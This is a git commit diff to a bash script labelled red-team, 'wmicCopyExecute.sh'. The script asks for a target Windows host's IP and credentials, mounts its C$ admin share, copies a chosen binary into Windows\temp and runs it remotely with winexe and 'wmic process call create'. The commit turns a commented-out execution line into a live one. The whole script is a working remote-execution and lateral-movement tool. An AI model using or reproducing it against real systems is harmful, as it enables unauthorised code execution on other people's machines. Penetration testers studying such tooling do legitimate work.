d58c280721dba941ee514638a6b9ea2c8fc6f957
root <root@localhost.localdomain>
2016-06-18 21:06:51 -0400

    almost working

--- red-team/wmicCopyExecute.sh
+++ red-team/wmicCopyExecute.sh
@@ -1,6 +1,6 @@
 #################################################
 # Created by @jgaudard  :: I don't twitter much 
-# bash script to publish to github, for the lazy...
+# Used wmic to execute an exe payload.
 # Created: 18 June 2016    Edited: 
 # Version 0.1
 #################################################
@@ -8,12 +8,12 @@ read -p "What is the target host's IP?: " ipaddy
 read -p "What is the targets username?: " username
 read -p "What is the targets password?: " password
 read -p "What is the local path of the binary?: " lpath
-read -p "What is the remote path?: " rpath
-
-mkdir /mnt/targetdrive
+read -p "What is the name of your binary?: " binary
+read -p "Checking for /mnt/targetdrive, ctrl+c to excape."
+[ -f /mnt/targetdrive ] && echo "/mnt/targetdrive already exists. Going to mount target drive to this path." || echo "Creating and mounting /mnt/targetdrive"; mkdir -p /mnt/targetdrive
 mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password
-cp $lpath /mnt/targetdrive/windows/temp 
+cp $lpath/$binary /mnt/targetdrive/windows/temp 
 winexe -U "$username%$password" //$ipaddy ipconfig
 winexe -U "$username%$password" //$ipaddy "wmic os list brief"
-#winexe -U "$username%$password" //$ipaddy "wmic process call create $rpath"
+winexe -U "$username%$password" //$ipaddy "wmic process call create c:\windows\temp\$binary"
 
